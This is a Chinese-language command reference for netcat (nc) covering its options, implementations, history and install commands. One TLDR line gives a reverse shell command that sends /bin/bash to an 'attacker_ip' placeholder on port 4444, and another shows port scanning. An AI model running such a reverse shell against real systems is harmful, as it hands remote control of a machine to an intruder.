# TAGLINE

通过 TCP 和 UDP 连接读写任意数据——网络界的瑞士军刀

# TLDR

在 TCP 端口上**监听**并打印收到的内容

```nc -l [8080]```

**连接**到主机的某个端口

```nc [host] [port]```

通过连接**发送文件**（发送方）

```nc [host] [port] < [file.txt]```

通过连接**接收文件**（监听方）

```nc -l [port] > [file.txt]```

**扫描端口范围**且不发送数据

```nc -zv [host] [20-30]```

用 **UDP** 代替 TCP

```nc -u [host] [port]```

设置 **5 秒的空闲与连接超时**

```nc -w [5] [host] [port]```

在 stdin/stdout 上打开简单的聊天/串口桥

```nc -l [1234]```

快速创建反向 shell（仅在获得授权时使用）

```nc -e [/bin/bash] [attacker_ip] [4444]```

# SYNOPSIS

**nc** [_options_] _host_ _port_

**nc** **-l** [_options_] [_host_] _port_

# PARAMETERS

**-l**
> 监听传入连接，而不是主动发起连接。

**-k**
> （OpenBSD/Ncat）客户端断开后继续监听；接受多个连接。

**-u**
> 使用 UDP 而不是默认的 TCP。

**-z**
> 零 I/O 模式——仅打开连接以测试端口是否开放。配合 **-v** 用于扫描。

**-v** / **-vv**
> 详细输出；打印连接和协议诊断信息。重复使用可获得更多细节。

**-n**
> 不执行任何 DNS 或服务名查询。

**-w** _SECONDS_
> 连接/空闲超时。连接在 _seconds_ 秒内无数据后关闭。

**-q** _SECONDS_
> stdin 上遇到 EOF 后，等待 _seconds_ 秒再关闭网络套接字（用 -1 表示无限等待）。

**-p** _PORT_
> 将连接的本地端绑定到 _port_（源端口）。

**-s** _ADDR_
> 将连接的本地端绑定到 _addr_（源地址）。

**-e** _COMMAND_
> （传统版本/带 --allow-exec 的 ncat）建立连接后执行 _command_，并将其 I/O 重定向到套接字。出于安全考虑，许多发行版已禁用此功能。

**-4** / **-6**
> 强制使用 IPv4 或 IPv6。

**-U**
> 使用 Unix 域套接字代替 TCP/UDP。此时"port"参数为套接字路径。

**-X** _PROTOCOL_
> 通过代理连接，PROTOCOL 可取：4（SOCKS4）、5（SOCKS5）或 connect（HTTP CONNECT）。

**-x** _ADDR_[_:port_]
> 与 **-X** 配合使用的代理服务器地址（及可选端口）。

# DESCRIPTION

**nc**（netcat）使用 TCP 或 UDP 在网络连接上读取和写入数据。它既可以作为可被其他程序和脚本驱动的可靠后端工具，也可以作为功能丰富的网络调试和探测工具。

常见用途包括：临时开启客户端/服务器套接字、传输文件、抓取横幅信息、端口扫描（**-z**）、代理转发、在 Unix 域套接字上监听（**-U**），以及经由 SOCKS 或 HTTP CONNECT 代理建隧道（**-X**、**-x**）。

有几个互不兼容的实现通常都以 **nc** 这个名称安装：

- **OpenBSD netcat**——大多数 Linux 和 macOS 系统上的默认版本；易于脚本化，没有 `-e`。
- **GNU netcat**——较旧、较简单，支持 `-e`。
- **Ncat**（Nmap 项目）——可脚本化的替代品，支持 TLS、IPv6、代理和中继。

各实现的行为和支持的选项有所不同；用 `nc -h` 查看已安装的是哪个版本。

# CAVEATS

不同实现的选项集不同——针对某一个 **nc** 编写的可移植脚本在另一个实现上可能失效。**-e** 选项（连接后执行程序）出于安全考虑在 OpenBSD netcat 中已被禁用；许多加固过的发行版不带该功能。用 **nc** 监听不提供任何身份验证或加密——绝不要在不受信任的网络上暴露裸 nc 监听器。

# HISTORY

最初的 netcat 由 **"Hobbit"** 编写，于 **1995–1996 年**发布到 `alt.security`。OpenBSD 项目后来从零重写了它，该版本成为 BSD、macOS 和大多数现代 Linux 发行版的事实标准。**Ncat** 作为 **Nmap** 项目的一部分开发，增加了现代特性（TLS、IPv6、代理、中继）。

# INSTALL

```apk: sudo apk add netcat-openbsd```

```zypper: sudo zypper install netcat-openbsd```

```nix: nix profile install nixpkgs#netcat-openbsd```

<!-- packages: 2026-07-22 -->

# SEE ALSO

[ncat](/man/ncat)(1), [socat](/man/socat)(1), [telnet](/man/telnet)(1), [curl](/man/curl)(1), [ssh](/man/ssh)(1)
